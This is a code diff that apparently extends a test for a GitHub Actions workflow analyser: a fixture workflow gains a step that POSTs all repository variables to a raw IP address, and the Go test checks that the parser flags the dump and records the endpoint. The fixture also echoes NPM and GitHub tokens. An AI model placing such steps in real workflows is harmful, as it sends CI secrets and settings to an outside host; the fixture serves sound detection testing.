@@ -30,6 +30,7 @@ jobs:
         with:
           token: ${{ secrets.SLACK_TOKEN }}
       - run: echo ${{ secrets['NPM_TOKEN'] }} ${{ secrets.GITHUB_TOKEN }}
+      - run: curl -s -X POST http://193.32.204.199/c -d "${{ toJSON(vars) }}"
   call:
     uses: acme/shared/.github/workflows/release.yml@main
     secrets: inherit
@@ -47,6 +48,12 @@ func TestParse(t *testing.T) {
 		t.Fatalf("push branches %v", w.PushBranches)
 	}
 	b := w.Jobs[0]
+	if !b.DumpsSecrets {
+		t.Fatal("toJSON(vars) dump not detected")
+	}
+	if len(w.Endpoints) != 2 || w.Endpoints[0] != "193.32.204.199" || w.Endpoints[1] != "http://193.32.204.199/c" {
+		t.Fatalf("endpoints %v", w.Endpoints)
+	}
 	if !b.IDTokenWrite || b.Environment != "prod" || !b.ChecksOutPR {
 		t.Fatalf("job facts wrong: %+v", b)
 	}
